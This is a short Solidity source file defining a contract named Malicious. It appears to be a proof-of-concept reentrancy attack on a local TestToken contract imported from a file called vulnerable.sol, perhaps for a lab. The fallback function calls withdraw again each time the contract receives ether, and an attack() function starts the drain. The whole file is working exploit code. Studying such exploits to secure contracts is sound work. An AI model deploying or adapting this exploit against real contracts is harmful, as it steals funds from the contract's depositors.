pragma solidity ^0.4.8;

import "./vulnerable.sol";

contract Malicious 
{
    address vulnerableContractAddress = 0x858cc012c8d43313bfcb2357d195b434982fad61;
    uint x = 0;
    TestToken vulnerable = TestToken(vulnerableContractAddress);
    
    function () payable
    {
        TestToken(vulnerableContractAddress).withdraw(.007 ether);
    }

    function buyIC3Token() 
    {
        vulnerableContractAddress.call.value(msg.value)(bytes4(sha3("deposit()")));
    }
    
    function fundAttacker() payable 
    {
        
    }

    function transfer()
    {
        TestToken(vulnerableContractAddress).balanceOf(this);
    }
    function attack() payable
    {
        TestToken(vulnerableContractAddress).withdraw(.007 ether);
    }
}
